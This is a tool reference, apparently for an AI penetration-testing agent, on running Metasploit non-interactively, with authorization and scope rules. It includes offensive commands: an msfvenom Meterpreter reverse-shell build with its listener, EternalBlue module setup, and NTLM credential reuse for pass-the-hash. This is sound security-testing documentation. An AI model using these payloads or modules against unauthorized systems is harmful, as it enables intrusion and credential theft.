# Metasploit Framework

Metasploit is an exploitation framework: a module library (exploits, auxiliary
scanners, payloads, post-exploitation, encoders) plus `msfconsole` to drive it,
`msfvenom` to build standalone payloads, and a PostgreSQL-backed store for
hosts, services, credentials, notes, and loot. In this toolchain it is the step
after scanning: `nuclei`/`nmap` say a service looks vulnerable, Metasploit
either proves it non-destructively with `check` or turns it into a session. It
also replaces `searchsploit`, which has no bookworm package.

Everything below was verified by running the commands against the
`pen/agent:tools-test` container (image
`sha256:8c94fb556cac4905cb72c35bac20cda309ba80a38dd9f102b811a7c35e12722e`,
built 2026-09-17T20:44:48Z). The container was destroyed and recreated during
verification, so every claim was checked again on that image; timings are from
it unless stated. The `tools-test` tag has since moved to
`sha256:229b64b6ad89…`; a spot check of that image reproduced the package
version, console version, install paths, `msfdb` root refusal, the two-week
warning, `search` results, the exact same ELF payload hash, and the absence of
`xxd`. Anything not directly executed is marked **unverified**.

## Installation and location

Installed from Rapid7's official apt repository as the omnibus
`metasploit-framework` deb, which carries its own Ruby and PostgreSQL binaries:

```
deb [signed-by=/usr/share/keyrings/metasploit-framework.gpg] https://apt.metasploit.com/ lucid main
```

| Item | Value |
|---|---|
| Debian package | `metasploit-framework 6.5.3~20260818061200~1rapid7-1` (`dpkg -l`) |
| Reported version | `Framework Version: 6.5.3-dev-`; `version` prints `Framework: 6.5.3-dev-` / `Console  : 6.5.3-dev-` |
| Install root | `/opt/metasploit-framework` (994 MB) |
| Launchers | `/opt/metasploit-framework/bin/{msfconsole,msfvenom,msfdb,msfrpcd,msfupdate,msfrpc,msfd,…}` |
| On PATH | `/usr/bin/<name>` → `/etc/alternatives/<name>` → `/opt/metasploit-framework/bin/<name>` (update-alternatives) |
| Embedded Ruby | `/opt/metasploit-framework/embedded/bin/ruby` — 3.4.4, used by the framework |
| System Ruby | `/usr/bin/ruby` — 3.1.2, unrelated; only shows up as gem warnings from `msfdb` |
| Per-user state | `$HOME/.msf4` (root: `/root/.msf4`) |

The `/usr/bin` entry points are update-alternatives symlinks to `/bin/sh`
wrapper scripts: each wrapper cds to `/opt/metasploit-framework/bin`, prepends
the embedded `bin` to `PATH`, unsets `GEM_HOME`/`GEM_PATH`/`RUBY_ROOT`, then
runs the real script. There is nothing in `/etc/profile.d`, so a login shell is
not needed — `bash -c 'msfconsole …'` works from any directory.

### Running without a TTY

`msfconsole` is an interactive readline console. With no TTY it still works,
but three things bite:

1. It reads **stdin** as console input. A piped script or an open-but-silent
   stdin becomes console input; `sleep 60 | msfconsole -q` never returns
   (verified: killed by `timeout` after 10 s, rc=124). Always close stdin.
2. `-x` executes commands but does **not** exit afterwards. Without an `exit`
   the console sits at the prompt, and when stdin closes it exits at EOF —
   after printing ANSI-coloured prompt fragments to stdout
   (`^[[4mmsf^[[0m ^[[0m> ^M^M…`), which corrupt output parsing.
3. The exit code is 0 even when the command failed: an unknown command and a
   `use exploit/does/not/exist` both exit 0 (verified). Never branch on
   `msfconsole`'s exit status; parse its output.

The invocation that works, for every one-shot task in these docs:

```bash
msfconsole -q -x 'version; exit' </dev/null
```

For more than a couple of commands, put them in a resource file and keep the
console call to one line:

```bash
msfconsole -q -r "$WORK/step.rc" -x 'exit' </dev/null
```

`-r -` reads the resource script from stdin (verified), which is the only case
where piping into the console is correct:

```bash
printf 'version\nexit\n' | msfconsole -q -r -
```

Exiting cleanly means issuing `exit` (alias `quit`). Never pass
`-a`/`--ask`: it turns exit into a confirmation prompt.

Streams: console output and command results go to **stdout**; the
"more than two weeks old" nag goes to **stderr**. `stty: 'standard input':
Inappropriate ioctl for device` appears in some non-TTY runs — noise, not an
error.

## Rules that apply to this tool

- **Authorization and scope first.** Exploit, brute-force, and scanner modules
  send attack traffic to the target. Run them only against hosts Greg has
  explicitly confirmed for the current engagement. If authorization for a host
  is unclear, it is unauthorized. A module that *can* be pointed at something
  is not permission to point it there.
- **Attribution is structural, not tool-level.** Every packet exits through the
  WireGuard tunnel in the shared network namespace. Metasploit's own
  `Proxies`/`ReverseAllowProxy` options, `LHOST` selection, or a `route`
  through a session change nothing about that containment and must never be
  used to try to bypass it. Set `LHOST` explicitly to the tunnel address so
  callbacks come back the same way; the auto-detected default is not
  trustworthy (in the test container it picked the docker bridge
  `172.17.0.5`, verified).
- **Never run an exploit, brute-force, or scanner module against an
  unconfirmed target.** That includes `check`, `run -j` handlers pointed at a
  third party, `db_nmap`, and any `auxiliary/scanner/*`.
- **Prefer `check` to `exploit`.** If a module reports `Check supported: Yes`,
  run `check` first and only escalate to `exploit` when the check is positive,
  the target is authorized, and there is a hypothesis about what will happen.
  `check` is not free — for some modules it is still a real probe — but it does
  not drop a payload.
- **Record evidence in the working directory.** Spool console output and export
  the database into the per-engagement directory (`/working/engagements/<name>`),
  not just into the transcript. DB state under `/root/.msf4` lives in the
  container's writable layer and disappears when the container is recreated.

## Command reference

### msfconsole flags

Complete list from `msfconsole -h` (verified; help goes to stdout, exit 0).

| Flag | Effect |
|---|---|
| `-q, --quiet` | Suppress the startup banner |
| `-x, --execute-command COMMAND` | Run console commands; separate multiples with `;` |
| `-r, --resource FILE` | Run a resource script; `-` reads it from stdin |
| `-o, --output FILE` | Send console output to FILE **instead of** the display (stdout then yields 0 bytes); not a tee |
| `-n, --no-database` | Disable database support (DB commands then report `[-] No database driver installed.`) |
| `-y, --yaml PATH` | Read database settings from a `database.yml` |
| `-l, --logger STRING` | Logger: `TimestampColorlessFlatfile`, `Flatfile`, `Stderr`, `Stdout`, `StdoutWithoutTimestamps` |
| `-m, --module-path DIRECTORY` | Load an additional module path |
| `--[no-]defer-module-loads` | Defer module loading until asked |
| `-p, --plugin PLUGIN` | Load a plugin at startup |
| `-c FILE` | Load a framework configuration file |
| `-E, --environment ENV` | Rails environment (default `production`) |
| `-M, --migration-path DIR` | Extra DB migration directory |
| `-a, --ask` | Ask before exiting — do not use in scripts |
| `-H, --history-file FILE` | Command history file |
| `-L, --real-readline` / `--[no-]readline` | Readline selection |
| `-v, -V, --version` | Version string |
| `-h, --help` | This help text |

### Console commands

`help` (or `?`) at the console lists everything, grouped: Core, Module, Job,
Resource Script, Database Backend, Credentials Backend, Developer, DNS,
Exploit. The ones that matter for scripted work:

| Command | Purpose |
|---|---|
| `version` | Framework and console version |
| `search …` | Find modules (below) |
| `use <full name\|index>` | Enter a module context; also accepts a search-result index |
| `info [module]`, `info -d [module]` | Module details; `-d` generates HTML docs (see gotchas) |
| `show options\|advanced\|missing\|targets\|payloads\|encoders\|exploits\|auxiliary\|all` | Context-dependent listings |
| `options`, `advanced` | Same listings without `show` |
| `set`, `setg`, `get`, `getg`, `unset`, `unsetg` | Per-module and global datastore |
| `save [-l\|-d\|-r]` | Persist active datastore to `/root/.msf4/config` |
| `run`, `exploit`, `check`, `rcheck`/`recheck`, `rerun`/`rexploit`, `reload` | Execute the current module |
| `back`, `previous`, `pushm`, `popm`, `listm`, `clearm` | Module stack navigation |
| `sessions …` | List, interact with, command, upgrade, kill sessions |
| `jobs …`, `handler …`, `kill <id>` | Background handlers and module runs |
| `resource <file…>`, `makerc <file>` | Resource scripts in and out |
| `spool <file>\|off` | Mirror console output to a file (see the `-o` gotcha) |
| `grep [OPTS] PATTERN CMD…` | Filter another command's output in-console (`-i`, `-v`, `-c`, `-m`, `-A/-B/-C`) |
| `connect <host> <port>` | Netcat-like connection honouring session pivots (`-s` SSL, `-u` UDP, `-z` probe only, `-w` timeout, `-i` send file) |
| `color` | Toggle colour; with `exit` the one-shot stdout is clean either way (verified) |
| `repeat`, `sleep`, `time`, `threads`, `history` | Console utilities |
| `db_status`, `db_connect`, `db_disconnect`, `db_save`, `db_import`, `db_export`, `db_nmap`, `workspace`, `db_stats`, `analyze` | Database |
| `hosts`, `services`, `vulns`, `creds`, `loot`, `notes`, `certs`, `klist` | Stored results |

`exit` and `quit` leave the console. `help <command>` works for most commands
but not all: `help check` and `help run` answer `[-] No such command` at the top
level because those commands only exist inside a module context (verified; use
`use <module>; check -h`).

### search

`search` with no arguments re-displays the previous result set.

| Flag | Effect |
|---|---|
| `-c, --hide-child` | Hide child rows (targets, AKAs); one row per module |
| `-o, --output FILE` | Write results as CSV (`#,Full Name,Disclosure Date,Rank,Check,Name`) |
| `-s, --sort-ascending COLUMN` | Sort by `rank`, `date`/`disclosure_date`, `fullname`, `name`, `type`, `check`, `action` |
| `-r, --sort-descending` | Reverse the sort order |
| `-S, --filter REGEX` | Regex filter over results |
| `-u, --use` | Enter the module context if exactly one module matches |
| `-I, --ignore` | Ignore the command if the only match has the same name |
| `-h, --help` | Help |

Keywords (all from `search -h`): `cve`, `edb`, `bid`, `osvdb`, `ref`,
`reference`, `name`, `fullname`, `path`, `description`, `author`, `type`,
`platform`, `arch`, `target`, `action`, `adapter`, `stage`, `stager`, `aka`,
`rank`, `check`, `date`, `mod_time`, `port`, `session_type`, `att&ck`.
`type` takes `exploit`, `auxiliary`, `payload`, `encoder`, `evasion`, `post`,
`nop`. Prefix a value with `-` to exclude it.

```bash
msfconsole -q -x 'search cve:2017-0144 -c; exit' </dev/null      # by CVE
msfconsole -q -x 'search type:exploit name:apache -c; exit' </dev/null
msfconsole -q -x 'search edb:42030; exit' </dev/null             # searchsploit-style ID
msfconsole -q -x 'search check:true type:exploit platform:linux -c; exit' </dev/null
```

Two verified traps: `name:`/`description:` match loosely against prose, so
`search name:http_version` returns `[-] No results from search` while
`search fullname:http_version` and `search path:http_version` find
`auxiliary/scanner/http/http_version`; and `name:"HTTP Version"` also matches
unrelated modules. Anchor on `fullname:` or `cve:`/`edb:` when module identity
matters, and check the `Full Name` column of the result.

### Module inspection and datastore

```bash
msfconsole -q -x 'info exploit/windows/smb/ms17_010_eternalblue; exit' </dev/null
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; show options; show missing; exit' </dev/null
```

`info` prints `Rank`, `Disclosed`, `Available targets`, `Check supported:`,
`Basic options:` with a `Required` column (`yes`/`no`), `Payload information`,
references, and AKAs. `show options` adds the payload and target blocks;
`show advanced` adds `Proxies`, `ConnectTimeout`, `CheckModule`, `WORKSPACE`,
payload advanced options and so on; `show missing` lists only required options
with no value — the fastest way to see what still has to be set (normally
`RHOSTS`). `Required = yes` options must be set; `no` options are optional and
usually have safe defaults. For an exploit module, `check` delegates to the
auxiliary module named in the advanced `CheckModule` option (verified for
`ms17_010_eternalblue`).

| Command | Verified output shape |
|---|---|
| `set RHOSTS 192.0.2.10` | `RHOSTS => 192.0.2.10` |
| `setg LPORT 5555` | `LPORT => 5555` (global, survives `use`/`back`) |
| `get RHOSTS` / `getg LPORT` | `RHOSTS => <value>` |
| `unset RHOSTS` | `Unsetting RHOSTS...`, then `get RHOSTS` prints an empty value |
| `show missing` | Header only once every required option has a value |

`set` flags: `-g/--global` (same as `setg`), `-c/--clear`, `-h`. `setg` has no
`-h`; it treats `-h` as a variable name (verified: prints `-h => `). Hosts can
be a space-separated list, a CIDR, a range (`192.0.2.10-192.0.2.20`), a
hostname, or `file:/path/to/list.txt`; the `file:` form is stored verbatim and
resolved when the module runs (verified as accepted and stored, not expanded in
`show options`).

### Running modules

| Command | Effect |
|---|---|
| `run` / `exploit` | Execute the current module (`run` is an alias) |
| `check` | Non-exploit vulnerability check; requires `Check supported: Yes` |
| `run -j` | Run as a background job (`jobs` lists it) |
| `run -z` | Do not interact with a session after success |
| `run -o VAR=VAL,…` | Set options for this invocation only |
| `run -p PAYLOAD`, `-e ENCODER`, `-t TARGET`, `-n NOP` | Per-run payload/encoder/target choices |
| `run -q` | Quiet |
| `run -f` | Force run despite `MinimumRank` |
| `run -J` | Force foreground even for passive modules |
| `run -r` | Reload libraries first |
| `rcheck` / `recheck` | Reload the module, then `check` |
| `rerun` / `rexploit` | Reload the module, then run it |
| `reload` | Reload the module without running |

`check` accepts `-j`, `-o`, `-q`, `-J`, `-r`, `-h`. Verified output shape on a
target with nothing listening:

```
[*] 127.0.0.1:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 127.0.0.1:445 - Rex::ConnectionRefused: The connection was refused by the remote host (127.0.0.1:445).
[*] 127.0.0.1:445 - Scanned 1 of 1 hosts (100% complete)
[*] 127.0.0.1:445 - Cannot reliably check exploitability.
```

`check -h` documents target forms including `check 192.0.2.1-192.0.2.254`,
`check file:///tmp/rhost_list.txt`, and `check smb://user:pass@host`.

### Jobs and handlers

| Command | Effect |
|---|---|
| `jobs` / `jobs -l` | List jobs (`Id`, `Name`, `Payload`, `Payload opts`) |
| `jobs -i <id>` | Details for one job |
| `jobs -k <id\|range>` / `-K` | Kill one / all jobs |
| `jobs -p <id>` / `-P` | Persist a job / all jobs across console restarts |
| `jobs -S <filter>`, `-v` | Filter, verbose |
| `handler -p PAYLOAD -H LHOST -P LPORT -n NAME` | Start a payload handler as a background job |
| `handler -x` | Shut the handler down after the first session |
| `handler -e ENCODER` | Stage encoder |

Handlers and jobs live inside the console process. They die with `exit`, and
two handlers cannot share a port, so keep listener consoles separate and
serialise them. Once a console has saved handlers (`jobs -P`), every later
startup prints `[*] Starting persistent handler(s)...` on stdout before the
first command (verified) — noise, not an error.

### Sessions

| Flag | Effect |
|---|---|
| `sessions` / `-l` / `-v` / `-x` | List active sessions (plain, verbose, extended) |
| `sessions -d` | List inactive sessions |
| `sessions -i <id>` | Interact with a session |
| `sessions -c '<command>'` | Run a shell command on the session given with `-i`, or on all |
| `sessions -C '<command>'` | Run a Meterpreter command on the session given with `-i`, or on all |
| `sessions -s <script\|module>` | Run a script or post module on the session given with `-i`, or on all |
| `sessions -u <id>` | Upgrade a shell session to Meterpreter |
| `sessions -k <id\|range>` / `-K` | Kill selected / all sessions |
| `sessions -n <id> <name>` | Name or rename a session |
| `sessions -t <seconds>` | Response timeout (default 15) |
| `sessions -S <filter>` | Row filter, e.g. `session_type:meterpreter` |

IDs accept ranges and lists: `sessions -k 1-2,5`. With no sessions the table
reads `No active sessions.` `sessions -i` is an interactive prompt that reads
stdin — with no TTY, drive sessions with `sessions -c`, `-C` and `-s` instead
(**unverified**: no session could be created without an authorized target).
Backgrounding an interactive session is a console readline feature (`Ctrl-Z`),
so it is not available here (**unverified** for the same reason).

### Resource scripts

```bash
msfconsole -q -r "$WORK/step.rc" -x 'exit' </dev/null
msfconsole -q -r - <<'RC'
version
exit
RC
```

Verified behaviour: `[*] Processing <file> for ERB directives.` then each line
echoed as `resource (<file>)> <command>` with its output; the resource file runs
**before** the `-x` commands. `#` comments are ignored. Multi-line command
strings in `-x` are fine — the driver splits on `;` and tolerates newlines and
indentation. `<ruby>…</ruby>` blocks execute Ruby (verified:
`<ruby>puts "[erb] #{1+1}"</ruby>` printed `[erb] 2`); `<% … %>` is ERB template
syntax and is also accepted. A bare `ruby …` line is **not** Ruby — it is
dispatched as an external command and fails (`ruby: No such file or directory
-- puts (LoadError)`, verified). `makerc <file>` writes the commands issued
since startup, but only "real" commands: a session containing just `setg`
reported `[-] No commands to save!` (verified).

### Database

The console has no database by default: `db_status` prints
`[*] postgresql selected, no connection`, and every DB command answers
`[-] Database not connected`. `msfdb` — not the console — owns the cluster,
and it **refuses to run as root**:

```
$ msfdb status
Please run msfdb as a non-root user
```

That is a hard check in the script
(`/opt/metasploit-framework/embedded/framework/msfdb`:
`if !Gem.win_platform? && Process.uid.zero?`), with no bypass flag. The agent
runs as root, so the DB is unusable until a non-root user initialises it;
§"Limits" has the verified recipe. PostgreSQL itself is present only inside the
bundle
(`/opt/metasploit-framework/embedded/bin/{initdb,postgres,pg_ctl,psql,…}`);
there is no system `psql`, no `/etc/postgresql`, and no `pg_ctlcluster`.

| Command | Effect |
|---|---|
| `msfdb [options] <command>` | Commands: `init`, `reinit`, `delete`, `status`, `start`, `stop`, `restart`; `--component webservice` switches to the web service |
| `--use-defaults` | Accept all defaults without prompting (needed for `reinit`/`delete`) |
| `--msf-db-name`, `--msf-db-user-name`, `--db-port` (default 5433), `--db-pool` (default 200) | Cluster/database naming and port |
| `--connection-string URI` | Use an existing cluster, e.g. `postgresql://postgres:pw@host:5432/postgres` |
| `-a/--address`, `-p/--port` (5443), `--[no-]ssl`, `--ssl-key-file`, `--ssl-cert-file` | Web service options |
| `msfdb status` | `Running the 'status' command for the database:` / `Database started` |

Console-side connection: `msfconsole -y <path>/database.yml` (or `db_connect -y
<path>`), verified to yield `[*] Connected to msf. Connection type: postgresql.`
`db_connect` also takes `user:pass@host:port/db` and HTTP data-service URLs, and
`--name` to save a connection; `db_save` makes the current connection the
default for future consoles.

Result tables and their export flags (`-h` output, verified with data in the
DB):

| Command | Filters/actions | Export |
|---|---|---|
| `hosts` | `-a/--add <host>`, `-d/--delete`, `-n/--name`, `-i/--info`, `-m/--comment`, `-t/--tag`, `-T/--delete-tag`, `-u/--up`, `-c/--columns`, `-C/--columns-until-restart`, `-O/--order`, `-S/--search`, `-R/--rhosts` | `hosts -o file.csv` |
| `services` | `-a` with `-p/--port`, `-s/--name`, `-r/--protocol tcp\|udp` and an address; `-d/--delete`, `-U/--update`, `-u/--up`, `-c/--column`, `-O/--order`, `-S/--search`, `-R/--rhosts` | `services -o file.csv` |
| `vulns` | `[addr range]`, `-p/--port`, `-s/--service`, `-i/--info`, `-v/--verbose`, `-S/--search`, `-R/--rhosts` | `vulns -o file.csv` |
| `creds` | `creds add user:… password:…` (also `ntlm:`, `hash:`, `postgres:`, `ssh-key:`, `pkcs12:`, `realm:`); filters `-u`, `-P`, `-p`, `-s`, `-t`, `-O`, `-r`, `-R`, `-v`; `-d/--delete` | `creds -o file.csv`, `file.jtr` (John), `file.hcat` (hashcat) |
| `notes` | `-a -t <type> -n <data> <addr>`, `-d`, `-t`, `-S`, `-O`, `-R` | `notes -o file.csv` |
| `loot` | `-a -f <file> -i <info> -t <type> <addr>`, `-d`, `-t`, `-S`, `-u` | **none** — `loot -o file` fails with `[-] Invalid host parameter` (verified) |
| `workspace` | `workspace`, `workspace <name>`, `-a`, `-d`, `-D`, `-r`, `-l`, `-v`, `-S` | via `db_export` |
| `db_export` | `db_export -f <xml\|pwdump> [file]` | XML is the full-workspace dump |
| `db_import` | `db_import <file…>` auto-detects 35 formats including Nmap XML, Masscan XML, Nessus XML v1/v2, OpenVAS, Burp Issue/Session XML, Nikto XML, Metasploit XML/Zip/PWDump, Libpcap and IP lists |  |
| `db_nmap` | Runs the system `nmap` (7.93) and stores the results; accepts nmap's own arguments |  |
| `db_stats` | Workspace row counts (note: `db_stats -h` runs the command instead of printing help — verified) |  |

CSV exports print `[*] Wrote <what> to <file>`; `db_export` prints
`[*] Starting export of workspace <ws> to <file> [ xml ]...` /
`[*] Finished export …`. CSV files are quoted with a header row. `db_export -h`
prints its usage and then `[-] No output file was specified` (verified).

### msfvenom

Standalone payload generator: no console, no session, writes a file (or stdout
with `-f raw`). Verified flags (`msfvenom -h`; help goes to **stderr** and exits
1):

| Flag | Effect |
|---|---|
| `-p, --payload <name>` | Payload (`--list payloads`; 2606 entries in this build). `-` reads shellcode from stdin |
| `--list-options` | Standard, advanced and evasion options for the selected payload |
| `-f, --format <fmt>` | Output format — 31 executable formats (`elf`, `exe`, `exe-only`, `exe-service`, `exe-small`, `dll`, `elf-so`, `msi`, `war`, `jsp`, `asp`, `aspx`, `psh`, `hta-psh`, `vba`, `vbs`, `macho`, `osx-app`, `jar`, `python-reflection`, …) and 33 transform formats (`raw`, `c`, `csharp`, `python`, `ruby`, `perl`, `java`, `bash`, `sh`, `powershell`, `hex`, `base64`, `js_le`, `js_be`, `rust`, `zig`, `go`, …) |
| `-e, --encoder <enc>` | Encoder (`--list encoders`), e.g. `x64/xor_dynamic`, `x64/xor`, `x86/shikata_ga_nai` |
| `-i, --iterations <n>` | Encode n times |
| `-a, --arch <arch>` | Architecture (`--list archs`); inferred from the payload if omitted |
| `--platform <p>` | Platform (`--list platforms`); inferred from the payload if omitted |
| `-o, --out <path>` | Write to file (otherwise stdout) |
| `-b, --bad-chars <list>` | Characters to avoid, e.g. `'\x00\x0a'`; chooses encoders automatically when `-e` is absent |
| `-n, --nopsled <len>` / `--pad-nops` | Prepend a NOP sled / pad the payload to `-n` |
| `-s, --space <len>` / `--encoder-space <len>` | Maximum payload / encoded-payload size |
| `--smallest` | Ask every encoder for the smallest result |
| `--encrypt <aes256\|base64\|rc4\|xor>` | Wrap the shellcode in an encryption layer; `--encrypt-key`, `--encrypt-iv` |
| `-x, --template <path>` / `-k, --keep` | Use an executable as a template / keep template behaviour and inject as a new thread |
| `-c, --add-code <path>` | Additional win32 shellcode to include |
| `-v, --var-name <name>` | Variable name for `c`/`python`-style output |
| `--service-name`, `--sec-name` | Names for `exe-service` / large Windows binaries (`--sec-name` defaults to a random 4-character string) |
| `-t, --timeout <sec>` | Timeout when reading shellcode from stdin (default 30) |
| `--refresh-cache` | Rebuild the module metadata cache before listing |
| `-l, --list <type>` | `payloads`, `encoders`, `nops`, `platforms`, `archs`, `encrypt`, `formats`, `all` |

Unlike `msfconsole`, `msfvenom` **does** return non-zero on failure
(`msfvenom -p bogus/bogus …` → `Error: invalid payload: bogus/bogus`, rc=2).
Progress messages go to stderr, the artifact to stdout; `-h` also goes to
stderr with rc=1. Payloads are written to disk only — no network traffic — so
generation is always safe; delivering the artifact is not.

### msfrpcd

| Flag | Effect |
|---|---|
| `-a <IP>` / `-p <port>` | Bind address (default `0.0.0.0`) / port (default 55553) |
| `-U <user>` / `-P <pass>` | RPC credentials |
| `-S` | Disable SSL (default is SSL on) |
| `-c <cert>` / `-k <key>` | Certificate / private key paths |
| `-t <seconds>` | Token timeout (default 300) |
| `-n` | Disable database |
| `-j` | Start the JSON-RPC server |
| `-f` | Run in the foreground instead of backgrounding |
| `-u <URI>`, `-v` | Web-server URI / client-cert verification |

Despite the `/api/v1/json-rpc` path, the endpoint requires
`Content-Type: binary/message-pack` and a MessagePack body — plain JSON is
rejected with `ArgumentError: Invalid Content Type` (verified empirically for
`application/json`, `application/json-rpc` and no content type; the check is in
`lib/msf/core/rpc/v10/service.rb`). Treat msfrpcd as a MessagePack RPC, not a
JSON API. It also self-backgrounds, so `kill $!` does not stop it.

## Typical workflows

1. **Find and qualify a module.** `search cve:<id> -c` or
   `search type:exploit name:<product> -c`; `use <fullname>`; `info` to read
   `Rank`, `Disclosed`, targets and `Check supported:`; `show missing` for the
   required options; `show options`/`show advanced` for the rest. Stop before
   `run` unless the target is confirmed.
2. **Validate non-destructively.** Inside the confirmed target's module:
   `set RHOSTS <target>`, `setg THREADS 1`, then `check`. A `Cannot reliably
   check exploitability.` result means no answer, not "safe"; record it and
   move on rather than escalating to `exploit` on a hunch.
3. **Generate a payload.** `msfvenom -p <payload> LHOST=<tunnel IP> LPORT=<port>
   -a <arch> --platform <platform> -f <format> -o "$WORK/<name>"`, optionally
   `-e <encoder> -i <n> -b '\x00'`. Verify with `file`, `sha256sum`, and a byte
   count for the forbidden characters.
4. **Run a scripted engagement step.** Put the commands in a `.rc` file under
   `$WORK`, run `msfconsole -q -r "$WORK/<step>.rc" -x 'exit' </dev/null`, and
   spool the transcript into `$WORK` so the evidence outlives the container.
5. **Keep findings across runs.** Initialise the database once per container
   (§Limits), import scanner output with `db_import`, keep one workspace per
   engagement, and export with `db_export -f xml "$WORK/msf-workspace.xml"` plus
   per-table CSVs at the end. Anything left only in `/root/.msf4` is lost when
   the container is recreated.

## Output and parsing

- **Database location.** `msfdb` keeps the cluster under `$HOME/.msf4/db` with
  credentials in `$HOME/.msf4/database.yml` (root: `/root/.msf4/…`); the
  bundled PostgreSQL listens on `127.0.0.1:5433`. The module cache is
  `$HOME/.msf4/store/module_metadata_cache.json` (1.0 MB) plus
  `modules_metadata.json` (11 MB). All of it is inside the container's writable
  layer unless `HOME` is pointed at the bind-mounted working directory.
- **Machine-readable output.** There is no JSON mode in the console. Use:
  `search -o out.csv`; `hosts|services|vulns|creds|notes -o out.csv`;
  `creds -o out.jtr` / `out.hcat` for cracker handoff; `db_export -f xml
  out.xml` for a full workspace dump; `db_export -f pwdump out.txt` for
  credentials. `loot` has no `-o`; export it through `db_export -f xml`. For a
  network API, `msfrpcd` speaks MessagePack, not JSON.
- **Console transcripts.** Two mechanisms, and they do not combine:
  `-o FILE` **redirects** console output to FILE, so nothing is printed on
  stdout (`msfconsole -q -x 'version; exit' </dev/null -o out.log` yields 0
  bytes on stdout and a clean, ANSI-free `out.log`, verified); `spool FILE` /
  `spool off` **tees** output to a file while still printing it, and the file is
  ANSI-free (verified). Passing both breaks `spool` with
  `[-] Error while running command spool: undefined method '[]' for nil`
  (`core.rb:1429` reads `driver.output.config[:color]`, and `-o` installs an
  output whose `config` is nil — verified with and without a resource file).
  Pick one.
- **Colour and prompts.** Even with no TTY the console prints ANSI-wrapped
  prompt fragments (`^[[4mmsf^[[0m ^[[0m>`) unless the run ends with `exit`
  (verified); with `; exit` the stdout of a one-shot run contains no escape
  sequences. Practical rule: always end `-x` with `; exit`, and strip anything
  left with `sed -e 's/\x1b\[[0-9;]*m//g'` when parsing.
- **Banner and nag suppression.** `-q` removes the ASCII banner only. The
  two-week warning is printed to stderr by the launcher wrapper before Ruby
  starts (`/opt/metasploit-framework/bin/msfconsole`, line 98:
  `find $FRAMEWORK/$cmd -mmin +20160` — 20160 minutes = 14 days since the file
  was written), so filter it with `2>/dev/null`, not `-q`. `stty: 'standard
  input': Inappropriate ioctl for device` is the same class of noise.
- **Determinism.** Close stdin (`</dev/null`); end with `exit`; set `RHOSTS`,
  `LHOST`, `LPORT`, `THREADS` explicitly rather than trusting autodetection;
  pass `-a`/`--platform` to `msfvenom` to silence "no platform was selected";
  set `ConnectTimeout` so a dead target fails fast; use `-c` on `search` so
  child rows do not shift indices; and prefer one module per console run over a
  long `-x` string, since a failure mid-string does not stop the rest.

## Chaining with the rest of the toolchain

- **nmap → database.**

  ```bash
  nmap -Pn -sT -p 8000,9999 -oX "$WORK/scan.xml" "$TARGET"
  msfconsole -q -y "$DBN" -x "workspace -a $ENGAGEMENT; db_import $WORK/scan.xml; services; exit" </dev/null
  ```

  Verified on loopback: `[*] Importing 'Nmap XML' data`, `[*] Importing host
  127.0.0.1`, `[*] Successfully imported …`, and both open and closed ports
  landed in `services`. `db_nmap <nmap args>` does the same in one step by
  shelling out to the bundled `nmap` 7.93.
- **Scanner output → module targets.** `services -R`, `hosts -R`, `vulns -R`
  and `creds -R` copy the current result set into `RHOSTS` (verified:
  `RHOSTS => 192.0.2.10 192.0.2.11`). For a file of hosts,
  `set RHOSTS file:$WORK/hosts.txt` is accepted, and `check`/`run` accept
  `file:///path` per their own `-h` examples. Narrow with `-S` first
  (`hosts -S 192.0.2.1 -c address,service_count`) so a wide import does not
  silently widen scope.
- **Credentials → module options.** `netexec`/`impacket` findings become
  `creds add user:alice password:'…' realm:WORKGROUP` or
  `creds add user:bob ntlm:<hash>`, which then appear in the `creds` table
  (verified end to end, including NTLM auto-tagging as `nt,lm`). Feed them into
  a module with `set SMBUser alice; set SMBPass '…'; set SMBDomain WORKGROUP`
  (names verified from `show options` of `ms17_010_eternalblue` /
  `smb_ms17_010`); hash-only logins are the pass-the-hash variants of the same
  options. `creds -o "$WORK/hashes.hcat"` hands the same set to `hashcat`, and
  `creds -t ntlm -s smb` narrows to what an SMB module can use.
- **`searchsploit` replacement.** `search edb:<id>` looks up an Exploit-DB ID,
  `search cve:<id>` a CVE, `search bid:<id>` a Bugtraq ID, and
  `search ref:<string>` any reference. The `info` output lists the same
  references (NVD, Exploit-DB, ATT&CK) that `searchsploit` prints.
- **Payload → listener.** `msfvenom` writes the artifact; a handler console
  serves it:

  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$TUNNEL_IP LPORT=4444 \
    -a x64 --platform windows -f exe -o "$WORK/agent.exe"
  msfconsole -q -x "handler -p windows/x64/meterpreter/reverse_tcp -H $TUNNEL_IP -P 4444 -n $ENGAGEMENT; jobs -l; exit" </dev/null
  ```

  The `LHOST` in the payload and the `-H` in the handler must be the same
  tunnel address, or the callback arrives somewhere the console is not
  listening. Delivering the payload to a target is an exploit action and needs
  the same confirmation as running a module.

## Limits, failure modes and gotchas

- **The first console run builds the module cache.** With
  `$HOME/.msf4/store/` absent, a console run took **62.0 s**; with the cache
  present, **4.3–8.2 s** across five runs (verified on the final image, using
  `search` as the workload; a `-h` invocation returns in a few seconds). A fresh
  container looks hung on its first real command — it is not. The cache is
  rebuilt automatically; the store costs ~12 MB.
- **"This copy of metasploit-framework is more than two weeks old."** Printed
  to stderr by every omnibus launcher when the framework's own `msfconsole`
  file is older than 20160 minutes (14 days) — i.e. always in this image
  (file mtime 2026-08-18). Harmless; `-q` does not suppress it.
- **`msfupdate` inside a container.** `/opt/metasploit-framework/bin/msfupdate`
  is a 175-line POSIX script that writes
  `deb [signed-by=…] https://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid main`
  into `/etc/apt/sources.list.d/metasploit-framework.list`, installs the Rapid7
  PGP key, creates `/etc/apt/preferences.d/pin-metasploit.pref`, then runs
  `apt-get update` and `apt-get install -y --allow-downgrades
  metasploit-framework`. It needs network access and root, replaces the
  framework mid-container, and the update is lost when the container is
  recreated. Do not run it as routine maintenance; rebuild the image instead.
- **No cache, no DB, no history on a fresh container.** `$HOME/.msf4` is
  created on first run. All state (workspaces, credentials, notes, loot,
  handler persistence, command history) is container-local.
- **`msfdb` cannot run as root**, and PostgreSQL exists only inside the bundle.
  Verified recipe, as a non-root user with a writable `$HOME`:

  ```bash
  mkdir -p /tmp/msfhome && chown 1000:1000 /tmp/msfhome
  setpriv --reuid=1000 --regid=1000 --clear-groups env HOME=/tmp/msfhome msfdb init
  # → Running the 'init' command for the database: … Database initialization successful  (19.6 s, verified)
